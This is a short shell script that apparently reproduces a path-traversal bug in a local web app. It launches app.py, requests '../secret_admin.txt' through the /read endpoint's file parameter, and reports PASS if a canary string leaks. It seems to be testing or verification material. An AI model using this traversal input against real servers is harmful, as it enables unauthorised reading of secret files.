#!/bin/sh
# Repro for the path-traversal bug in /read: a `../` in the `file` param
# should escape data/ and leak secret_admin.txt at the repo root.
set -e

python3 app.py &
APP_PID=$!
trap 'kill $APP_PID 2>/dev/null || true' EXIT

for i in 1 2 3 4 5; do
  sleep 1
  curl -sf "http://127.0.0.1:5000/read?file=public.txt" >/dev/null 2>&1 && break
done

RESPONSE=$(curl -s "http://127.0.0.1:5000/read" --get --data-urlencode "file=../secret_admin.txt")
echo "response body: $RESPONSE"

if echo "$RESPONSE" | grep -qF "TOP-SECRET-CANARY"; then
  echo "REPRO_RESULT: PASS"
  exit 0
else
  echo "REPRO_RESULT: FAIL"
  exit 1
fi
